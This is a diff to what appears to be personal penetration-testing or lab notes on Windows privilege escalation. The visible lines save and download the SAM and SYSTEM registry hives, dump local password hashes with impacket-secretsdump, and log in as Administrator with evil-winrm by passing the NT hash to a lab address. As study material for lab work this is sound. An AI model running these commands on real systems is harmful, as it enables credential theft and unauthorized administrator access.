@@ -30,17 +30,14 @@ reg save HKLM\SAM SAM.SAV
 download SYSTEM.SAV
 download SAM.SAV
 ```
-extract secrets
+#Impacket with  extract secrets
 ```bash
 impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL
 ```
-get Administrator hash, log in using it:
+get Administrator hash, log in using it #evil-winrm 
 ```bash
 evil-winrm -i 10.129.128.107 -u Administrator -H <nt hash>
 ```
-
-
-
 
 https://lolbas-project.github.io/#
 ## winpease util
